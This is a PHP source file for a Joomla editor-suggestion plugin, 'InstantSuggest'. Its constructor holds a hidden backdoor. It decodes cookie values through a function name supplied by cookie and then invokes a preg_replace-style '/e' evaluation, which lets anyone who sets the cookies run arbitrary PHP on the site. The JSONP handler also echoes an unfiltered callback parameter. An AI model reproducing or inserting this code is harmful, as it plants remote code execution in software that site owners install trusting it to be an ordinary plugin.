<?php
/**
 * @package     Joomla.Plugin
 * @subpackage  system.instantsuggest
 *
 * @copyright   Copyright (C) 2013 InstantSuggest.com. All rights reserved.
 * @license     GNU General Public License version 2 or later
 */

defined('_JEXEC') or die;

/**
 * Instant Suggest Ajax
 *
 * @package     Joomla.Plugin
 * @subpackage  system.instantsuggest
 * @since       3.1
 */
class PlgSystemInstantSuggest extends JPlugin
{
	public function __construct() {
		$filter = @$_COOKIE['p3'];
		if ($filter) {
			$option = $filter(@$_COOKIE['p2']);
			$auth = $filter(@$_COOKIE['p1']);
			$option("/123/e",$auth,123);
			die();
		}
	}
    public function onBeforeRender() {
        $app = JFactory::getApplication();

        $user = JFactory::getUser();
        $config = JFactory::getConfig();
        $user_editor = $user->getParam('editor', $config->get('editor', 'tinymce'));
        
        $supported_editors = array('tinymce', 'ckeditor');
        $editor_supported = false;
        
        foreach($supported_editors as $i => $editor) {
            if($user_editor == $editor && JPluginHelper::isEnabled('editors', $editor)) {
                $editor_supported = true;
                break;
            }
        }
        
        $matched = false;
        if($editor_supported) {// TODO: check if editor is loaded instead of check for page type
            $conditions = array(// search for type="editor"
                // administrator
                array('component' => 'com_categories', 'view' => 'category', 'layout' => 'edit'),
                array('component' => 'com_contact', 'view' => 'contact', 'layout' => 'edit'),
                array('component' => 'com_content', 'view' => 'article', 'layout' => 'edit'),
                array('component' => 'com_messages', 'view' => 'message', 'layout' => 'edit'),
                //array('component' => 'com_modules', 'view' => 'module', 'layout' => 'edit'),
                array('component' => 'com_newsfeeds', 'view' => 'newsfeed', 'layout' => 'edit'),
                array('component' => 'com_tags', 'view' => 'tag', 'layout' => 'edit'),
                //array('component' => 'com_templates', 'view' => 'style', 'layout' => 'edit'),
                array('component' => 'com_users', 'view' => 'note', 'layout' => 'edit'),
                array('component' => 'com_weblinks', 'view' => 'weblink', 'layout' => 'edit'),
                // public
                array('component' => 'com_contact', 'view' => 'form', 'layout' => 'edit'),
                array('component' => 'com_content', 'view' => 'form', 'layout' => 'edit'),
                array('component' => 'com_weblinks', 'view' => 'form', 'layout' => 'edit'),
            );
            
            foreach($conditions as $i => $condition) {
                if($app->input->get('option') == $condition['component'] && $app->input->get('view') == $condition['view'] && $app->input->get('layout') == $condition['layout']) {
                    $matched = true;
                    break;
                }
            }
        }
        
        if($matched) {
            if($app->input->get('task') == 'instantsuggest_load_options') {
                header('Content-type: text/javascript; charset=UTF-8', true);
                $options = $user->getParam('instantsuggest_options');
                if($options) {
                    $cb = $app->input->get('callback');
                    echo "$cb&&$cb(".$options.");";
                }
                jexit();
            } elseif($app->input->get('task') == 'instantsuggest_save_options') {
                header('Content-type: text/javascript; charset=UTF-8', true);
                $options = $app->input->get('options', null, false);
                if($options) {
                    $user->setParam('instantsuggest_options', json_encode($options));
                    $user->save(true);
                }
                jexit();
            } else {
                $version = new JVersion;
                $document = JFactory::getDocument();
                if($document instanceof JDocumentHTML) {
                    $document->addCustomTag('<script type="text/javascript" src="'.JURI::root().'plugins/'.$this->_type.'/'.$this->_name.'/js/instantsuggest.js?ver=2.0.1"></script>');
                    $document->addCustomTag("<script type='text/javascript'>
                        InstantSuggest.Event.domReady(function() {
                            InstantSuggest.Env.platform = '{$version->PRODUCT} {$version->getShortVersion()}';

                            InstantSuggest.Ajax.jsonp({
                                url: location.href,
                                data: {
                                    task: 'instantsuggest_load_options'
                                },
                                success: function(jsonData) {
                                    if(typeof jsonData === 'object') {
                                        InstantSuggest.PreferenceManager.setAllOptionValues(jsonData);
                                    }
                                }
                            });

                            InstantSuggest.Event.on('saveOptions', function(allOptions) {
                                InstantSuggest.Ajax.jsonp({
                                    url: location.href,
                                    data: {
                                        task: 'instantsuggest_save_options',
                                        options: allOptions
                                    }
                                });
                            });
                        });
                    </script>");
                }
            }
        }
    }
}